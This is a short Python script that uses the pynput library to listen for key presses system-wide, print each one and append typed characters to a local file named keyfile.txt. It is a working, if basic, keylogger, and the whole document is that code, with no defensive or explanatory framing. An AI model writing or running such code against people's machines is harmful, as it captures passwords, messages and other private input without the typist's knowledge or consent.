from pynput import keyboard


def keyPressed(key):
    print(str(key))
    # Write keys to a text file
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char + "\n")
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
